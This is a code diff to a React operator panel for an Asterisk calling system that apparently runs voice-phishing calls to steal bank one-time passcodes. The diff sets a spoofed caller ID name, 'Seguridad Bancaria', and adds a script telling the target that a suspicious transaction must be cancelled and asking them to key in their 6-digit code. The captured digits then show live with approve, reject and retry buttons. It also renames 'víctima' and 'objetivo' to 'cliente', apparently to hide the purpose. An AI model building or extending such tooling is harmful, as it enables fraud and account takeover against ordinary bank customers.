@@ -39,6 +39,7 @@ import {
   Square,
   Sparkles,
   HelpCircle,
+  UserCheck,
 } from 'lucide-react';
 
 export interface CampaignAudioConfig {
@@ -231,7 +232,7 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
 
   // Dynamic CallerID fields directly configurable by agent
   const [callerIdNum, setCallerIdNum] = useState('+18005550199');
-  const [callerIdName, setCallerIdName] = useState('AnonymousOTP');
+  const [callerIdName, setCallerIdName] = useState('Seguridad Bancaria');
 
   // Auto-sync CallerID values when agentExtension changes
   useEffect(() => {
@@ -294,7 +295,7 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
     }
   };
 
-  // Agent OTP verification handler (Valid / Invalid buttons)
+  // Agent OTP verification handler (Valid / Invalid buttons decided by Agent)
   const handleVerifyOtp = async (
     status: 'valid' | 'invalid',
     targetOtp?: string,
@@ -312,8 +313,8 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
               otpStatus: status,
               validationNote:
                 status === 'valid'
-                  ? 'Código OTP verificado y APROBADO por el agente como VÁLIDO.'
-                  : 'Código OTP RECHAZADO por el agente como INVÁLIDO.',
+                  ? '✓ Código OTP verificado y APROBADO por el agente como VÁLIDO.'
+                  : '✕ Código OTP RECHAZADO por el agente como INVÁLIDO. Solicite nuevo código al cliente.',
             }
           : null
       );
@@ -329,14 +330,38 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
     );
 
     try {
-      await fetch('/api/asterisk/otp/verify', {
+      await fetch('/api/asterisk/otp/decision', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ id: recordId, number: num, status }),
+        body: JSON.stringify({ id: recordId, number: num, otp, status }),
       });
     } catch (e) {
-      console.warn('Error syncing OTP verification:', e);
+      console.warn('Error syncing OTP decision:', e);
     }
+  };
+
+  // Reset captured OTP in HUD to request a new code from client on the same call
+  const handleResetOtpCapture = async (number?: string) => {
+    const num = number || (activeCall ? activeCall.number : '');
+    if (activeCall) {
+      setActiveCall((prev) =>
+        prev
+          ? {
+              ...prev,
+              capturedOtp: undefined,
+              otpStatus: 'pending',
+              validationNote: 'Se solicitó nuevo código al cliente en llamada. Esperando que digite...',
+            }
+          : null
+      );
+    }
+    try {
+      await fetch('/api/asterisk/otp/decision', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ number: num, status: 'pending', action: 'request_retry' }),
+      });
+    } catch (e) {}
   };
 
   useEffect(() => {
@@ -456,7 +481,7 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
     try {
       const currentAudios = campaignAudios[selectedService];
       const effectiveCallerIdNum = callerIdNum.trim() || outboundCid;
-      const effectiveCallerIdName = callerIdName.trim() || 'AnonymousOTP';
+      const effectiveCallerIdName = callerIdName.trim() || 'Seguridad Bancaria';
 
       const res = await fetch('/api/asterisk/call/originate', {
         method: 'POST',
@@ -754,69 +779,115 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
               </div>
             </div>
 
+            {/* AGENT IN-CALL OTP WORKFLOW HUD */}
+            <div className="p-4 rounded-xl bg-slate-950/70 border border-slate-800 text-left space-y-3">
+              <div className="flex items-center justify-between">
+                <div className="flex items-center gap-2 text-xs font-bold text-sky-300 uppercase tracking-wide">
+                  <UserCheck className="w-4 h-4 text-emerald-400" />
+                  <span>Flujo Asistido por Agente: Solicitud y Validación Manual de OTP</span>
+                </div>
+                <span className="text-[11px] font-mono px-2.5 py-1 rounded-full bg-emerald-500/10 text-emerald-400 border border-emerald-500/30 flex items-center gap-1.5 font-bold">
+                  <span className="w-2 h-2 rounded-full bg-emerald-400 animate-ping" />
+                  Agente en Línea con Cliente
+                </span>
+              </div>
+
+              {/* Guión sugerido para que el Agente solicite el OTP al cliente en llamada */}
+              <div className="p-3 rounded-lg bg-slate-900 border border-sky-500/20 text-xs text-slate-300">
+                <span className="text-sky-400 font-bold block mb-1">🗣️ Guión para el Asesor (Solicitar código al cliente en llamada):</span>
+                <p className="italic text-slate-200">
+                  "Señor/a <strong className="text-white">{activeCall.name || 'cliente'}</strong>, por motivos de seguridad y anulación preventiva de la transacción sospechosa, le acabamos de remitir su clave de verificación de 6 dígitos. Por favor márquela en este momento en el teclado numérico de su teléfono mientras permanezco en línea con usted para validar la anulación."
+                </p>
+              </div>
+            </div>
+
             {activeCall.capturedOtp ? (
-              <div className="space-y-4">
-                <div className="flex items-center justify-center gap-2">
-                  {activeCall.capturedOtp.split('').map((digit, idx) => (
-                    <span
-                      key={idx}
-                      className="w-14 h-16 flex items-center justify-center text-3xl font-black font-mono text-emerald-400 bg-slate-950 rounded-xl border-2 border-emerald-500/60 shadow-lg shadow-emerald-500/30 animate-bounce"
-                      style={{ animationDelay: `${idx * 100}ms` }}
-                    >
-                      {digit}
-                    </span>
-                  ))}
+              <div className="space-y-5">
+                {/* Visualizador de dígitos ingresados */}
+                <div className="space-y-2">
+                  <div className="text-xs font-bold text-emerald-400 uppercase tracking-wider flex items-center justify-center gap-2">
+                    <span className="w-2.5 h-2.5 rounded-full bg-emerald-400 animate-pulse" />
+                    <span>Dígitos Ingresados por el Cliente en su Teléfono:</span>
+                  </div>
+                  <div className="flex items-center justify-center gap-2.5">
+                    {activeCall.capturedOtp.split('').map((digit, idx) => (
+                      <span
+                        key={idx}
+                        className="w-14 h-16 flex items-center justify-center text-3xl font-black font-mono text-emerald-400 bg-slate-950 rounded-xl border-2 border-emerald-500/60 shadow-lg shadow-emerald-500/30 animate-bounce"
+                        style={{ animationDelay: `${idx * 100}ms` }}
+                      >
+                        {digit}
+                      </span>
+                    ))}
+                  </div>
                 </div>
 
                 {/* BOTONES DE DECISIÓN DEL AGENTE (VÁLIDO / INVÁLIDO) */}
-                <div className="p-4 rounded-xl bg-slate-950/80 border border-slate-800/80">
-                  <div className="text-xs font-bold text-slate-300 uppercase tracking-wider mb-3">
-                    Validación del Agente: ¿El código OTP ingresado es correcto?
+                <div className="p-5 rounded-xl bg-slate-950/90 border border-slate-800 space-y-4">
+                  <div className="text-center space-y-1">
+                    <div className="text-sm font-black text-white uppercase tracking-wider">
+                      Decisión del Agente: ¿El código digitado por el cliente es VÁLIDO o INVÁLIDO?
+                    </div>
+                    <div className="text-xs text-slate-400">
+                      Tú como asesor decides la aprobación en el sistema según la respuesta de tu panel bancario.
+                    </div>
                   </div>
+
                   <div className="flex flex-wrap items-center justify-center gap-3">
                     <button
                       id="btn-otp-mark-valid"
                       type="button"
                       onClick={() => handleVerifyOtp('valid', activeCall.capturedOtp, activeCall.number)}
-                      className={`inline-flex items-center gap-2 px-6 py-3 rounded-xl font-bold text-sm shadow-xl transition-all ${
+                      className={`inline-flex items-center gap-2 px-6 py-3.5 rounded-xl font-black text-sm shadow-xl transition-all ${
                         activeCall.otpStatus === 'valid'
-                          ? 'bg-emerald-500 text-slate-950 ring-4 ring-emerald-400/40'
+                          ? 'bg-emerald-500 text-slate-950 ring-4 ring-emerald-400/50 scale-105'
                           : 'bg-emerald-600 hover:bg-emerald-500 text-white shadow-emerald-600/30'
                       }`}
                     >
                       <CheckCircle className="w-5 h-5" />
-                      <span>Marcar como VÁLIDO (Aprobar)</span>
+                      <span>APROBAR OTP (Código VÁLIDO)</span>
                     </button>
 
                     <button
                       id="btn-otp-mark-invalid"
                       type="button"
                       onClick={() => handleVerifyOtp('invalid', activeCall.capturedOtp, activeCall.number)}
-                      className={`inline-flex items-center gap-2 px-6 py-3 rounded-xl font-bold text-sm shadow-xl transition-all ${
+                      className={`inline-flex items-center gap-2 px-6 py-3.5 rounded-xl font-black text-sm shadow-xl transition-all ${
                         activeCall.otpStatus === 'invalid'
-                          ? 'bg-rose-500 text-white ring-4 ring-rose-400/40'
+                          ? 'bg-rose-500 text-white ring-4 ring-rose-400/50 scale-105'
                           : 'bg-rose-600 hover:bg-rose-500 text-white shadow-rose-600/30'
                       }`}
                     >
                       <XCircle className="w-5 h-5" />
-                      <span>Marcar como INVÁLIDO (Rechazar)</span>
+                      <span>RECHAZAR OTP (Código INVÁLIDO)</span>
+                    </button>
+
+                    {/* Botón para solicitar reingreso / limpiar dígitos y esperar nuevo código */}
+                    <button
+                      id="btn-otp-request-retry"
+                      type="button"
+                      onClick={() => handleResetOtpCapture(activeCall.number)}
+                      className="inline-flex items-center gap-2 px-4 py-3.5 rounded-xl font-bold text-sm bg-amber-500/20 hover:bg-amber-500/30 text-amber-300 border border-amber-500/40 transition-all"
+                    >
+                      <RefreshCw className="w-4 h-4" />
+                      <span>Solicitar Nuevo Código / Reintentar</span>
                     </button>
 
                     <button
                       id="btn-copy-live-otp"
                       type="button"
                       onClick={() => handleCopyOtp(activeCall.capturedOtp!, 'live-otp')}
-                      className="inline-flex items-center gap-2 px-5 py-3 rounded-xl font-bold text-sm bg-slate-800 hover:bg-slate-700 text-slate-200 border border-slate-700 transition-all"
+                      className="inline-flex items-center gap-2 px-4 py-3.5 rounded-xl font-bold text-sm bg-slate-800 hover:bg-slate-700 text-slate-200 border border-slate-700 transition-all"
                     >
                       {copiedId === 'live-otp' ? <Check className="w-4 h-4 text-emerald-400" /> : <Copy className="w-4 h-4 text-slate-400" />}
-                      <span>{copiedId === 'live-otp' ? '¡OTP Copiado!' : 'Copiar Código'}</span>
+                      <span>{copiedId === 'live-otp' ? '¡Copiado!' : 'Copiar'}</span>
                     </button>
                   </div>
 
-                  {/* Estado de validación actual */}
+                  {/* Detalle tras la decisión del agente */}
                   {activeCall.otpStatus && activeCall.otpStatus !== 'pending' && (
                     <div
-                      className={`mt-4 p-3 rounded-xl text-xs font-semibold flex items-center justify-between ${
+                      className={`p-3.5 rounded-xl text-xs font-semibold flex flex-col sm:flex-row sm:items-center justify-between gap-2 ${
                         activeCall.otpStatus === 'valid'
                           ? 'bg-emerald-500/15 border border-emerald-500/40 text-emerald-300'
                           : 'bg-rose-500/15 border border-rose-500/40 text-rose-300'
@@ -824,32 +895,51 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
                     >
                       <div className="flex items-center gap-2">
                         {activeCall.otpStatus === 'valid' ? (
-                          <CheckCircle className="w-4 h-4 text-emerald-400 shrink-0" />
+                          <CheckCircle className="w-5 h-5 text-emerald-400 shrink-0" />
                         ) : (
-                          <XCircle className="w-4 h-4 text-rose-400 shrink-0" />
+                          <XCircle className="w-5 h-5 text-rose-400 shrink-0" />
                         )}
-                        <span>
-                          {activeCall.otpStatus === 'valid'
-                            ? '✓ Código OTP marcado como VÁLIDO. Operación aprobada en el sistema.'
-                            : '✕ Código OTP marcado como INVÁLIDO. Rechazado por el agente.'}
+                        <div>
+                          <strong>
+                            {activeCall.otpStatus === 'valid'
+                              ? '✓ Operación Aprobada: El agente confirmó que el código OTP es VÁLIDO.'
+                              : '✕ Operación Rechazada: El agente marcó el código OTP como INVÁLIDO.'}
+                          </strong>
+                          <p className="text-[11px] font-normal text-slate-300 mt-0.5">
+                            {activeCall.otpStatus === 'valid'
+                              ? 'Puedes indicarle al cliente que la anulación fue exitosa y dar por terminada la llamada.'
+                              : 'Indícale al cliente que el código no coincide y usa el botón "Solicitar Nuevo Código / Reintentar" para recibir el nuevo.'}
+                          </p>
+                        </div>
+                      </div>
+                      <div className="flex items-center gap-2 shrink-0">
+                        <span className="text-[11px] font-mono px-2 py-0.5 rounded bg-slate-900 border border-slate-800">
+                          {new Date().toLocaleTimeString()}
                         </span>
                       </div>
-                      <span className="text-[11px] font-mono px-2 py-0.5 rounded bg-slate-900">
-                        {new Date().toLocaleTimeString()}
-                      </span>
                     </div>
                   )}
                 </div>
               </div>
             ) : (
-              <div className="py-6 text-slate-400 text-sm flex flex-col items-center justify-center gap-2 font-mono">
-                <div className="flex items-center gap-2">
-                  <RefreshCw className="w-5 h-5 animate-spin text-emerald-400" />
-                  <span className="font-semibold text-slate-300">Esperando que el objetivo digite el código en su teléfono móvil...</span>
+              <div className="py-8 text-slate-400 text-sm flex flex-col items-center justify-center gap-3 font-mono bg-slate-950/60 rounded-xl border border-slate-800/80">
+                <div className="flex items-center gap-2.5 text-emerald-400">
+                  <RefreshCw className="w-5 h-5 animate-spin" />
+                  <span className="font-bold text-slate-200 text-base">Esperando que el cliente digite el código en su teléfono...</span>
                 </div>
-                <span className="text-xs text-slate-500">
-                  En cuanto la víctima teclee los números en su llamada, aparecerán aquí en vivo con los botones para marcar si es válido o inválido.
-                </span>
+                <p className="text-xs text-slate-400 max-w-lg text-center leading-relaxed">
+                  Pídele verbalmente al cliente en la llamada que marque su clave en su teclado numérico. En cuanto el cliente presione las teclas, los dígitos aparecerán aquí instantáneamente para que decidas si lo apruebas como válido o lo rechazas.
+                </p>
+                <div className="flex items-center gap-2 pt-1">
+                  {Array.from({ length: 6 }).map((_, i) => (
+                    <span
+                      key={i}
+                      className="w-10 h-12 flex items-center justify-center text-lg font-bold font-mono text-slate-600 bg-slate-900/80 rounded-lg border border-slate-800"
+                    >
+                      •
+                    </span>
+                  ))}
+                </div>
               </div>
             )}
           </div>
@@ -1281,10 +1371,10 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
                       required
                       value={callerIdName}
                       onChange={(e) => setCallerIdName(e.target.value)}
-                      placeholder="AnonymousOTP"
+                      placeholder="Seguridad Bancaria"
                       className="w-full px-3 py-2 rounded-lg bg-slate-950 border border-slate-700 text-white font-mono text-sm focus:border-sky-500 focus:outline-none font-bold"
                     />
-                    <span className="text-[10px] text-slate-400">Reemplaza el "AnonymousOTP" en Asterisk</span>
+                    <span className="text-[10px] text-slate-400">Nombre público que se presentará en la pantalla del cliente</span>
                   </div>
                 </div>
 
@@ -1300,17 +1390,17 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
                   </button>
                   <button
                     type="button"
-                    onClick={() => { setCallerIdName('Verificación Seguridad'); setCallerIdNum('+18884561234'); }}
+                    onClick={() => { setCallerIdName('Seguridad Bancaria'); setCallerIdNum('+18005550199'); }}
                     className="text-[10px] px-2 py-0.5 rounded bg-slate-800 hover:bg-slate-700 text-sky-300 border border-slate-700 transition-colors"
                   >
-                    Seguridad OTP
+                    Seguridad Bancaria
                   </button>
                   <button
                     type="button"
-                    onClick={() => { setCallerIdName('AnonymousOTP'); setCallerIdNum('+18005550199'); }}
+                    onClick={() => { setCallerIdName('Servicio al Cliente'); setCallerIdNum('+18884561234'); }}
                     className="text-[10px] px-2 py-0.5 rounded bg-slate-800 hover:bg-slate-700 text-slate-300 border border-slate-700 transition-colors"
                   >
-                    Default (AnonymousOTP)
+                    Servicio al Cliente
                   </button>
                 </div>
 
